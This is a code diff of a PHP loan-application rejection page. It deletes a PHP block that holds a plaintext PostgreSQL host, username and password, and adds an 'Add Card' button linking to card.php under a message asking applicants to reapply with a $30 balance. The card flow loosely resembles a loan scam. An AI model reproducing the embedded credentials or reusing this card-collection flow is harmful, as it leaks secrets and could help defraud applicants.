@@ -1,60 +1,3 @@
-<?php
-session_start();
-
-if (!isset($_SESSION['phone'])) {
-    header("Location: login.php");
-    exit;
-}
-
-$phone = $_SESSION['phone'];
-
-// ========== POSTGRESQL CONFIGURATION ==========
-$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
-$dbPort = 5432;
-$dbName = "loan_9d8q";
-$dbUser = "loan_9d8q_user";
-$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
-// ==============================================
-
-function getDbConnection($host, $port, $dbname, $user, $pass) {
-    static $conn = null;
-    if ($conn === null) {
-        if (!function_exists('pg_connect')) {
-            error_log("PostgreSQL extension (pgsql) is NOT available.");
-            return false;
-        }
-        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
-        $conn = @pg_connect($connString);
-        if (!$conn) {
-            error_log("DB connection failed: " . pg_last_error());
-            return false;
-        }
-    }
-    return $conn;
-}
-
-// AJAX endpoint to check 'approve' status from 'users' table
-if (isset($_GET['check_approve']) && $_GET['check_approve'] == 1) {
-    header('Content-Type: application/json');
-    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
-    if (!$conn) {
-        echo json_encode(['error' => 'Database connection failed']);
-        exit;
-    }
-    
-    // Query the 'users' table for the approve column
-    $sql = "SELECT approve FROM users WHERE phone = $1";
-    $result = pg_query_params($conn, $sql, [$phone]);
-    if ($result && $row = pg_fetch_assoc($result)) {
-        $approve = (int)$row['approve'];
-        echo json_encode(['approve' => $approve]);
-    } else {
-        // If no record found, treat as not approved (0)
-        echo json_encode(['approve' => 0]);
-    }
-    exit;
-}
-?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -133,6 +76,24 @@ body {
 .reapply-btn:hover {
     background-color: #1d4ed8;
 }
+/* New button style for Add Card */
+.addcard-btn {
+    display: inline-block;
+    background-color: #10b981;   /* fresh green to differentiate */
+    color: white;
+    padding: 10px 22px;
+    font-size: 14px;
+    font-weight: bold;
+    border: none;
+    border-radius: 30px;
+    text-decoration: none;
+    cursor: pointer;
+    margin-top: 12px;            /* extra spacing below reapply button */
+    transition: background 0.2s;
+}
+.addcard-btn:hover {
+    background-color: #059669;
+}
 .footer {
     text-align: right;
     font-size: 11px;
@@ -165,7 +126,11 @@ body {
         <p>Please reapply and ensure that your information is correct<br>
         and your main account balance is at least <strong>$30</strong>.</p>
         <p>Thank you.</p>
+        <!-- Reapply button (existing) -->
         <a href="loan.php" class="reapply-btn">Reapply</a>
+        <!-- NEW BUTTON: Add Card - redirects to card.php -->
+        <br>
+        <a href="card.php" class="addcard-btn">➕ Add Card</a>
     </div>
 
     <div class="footer">
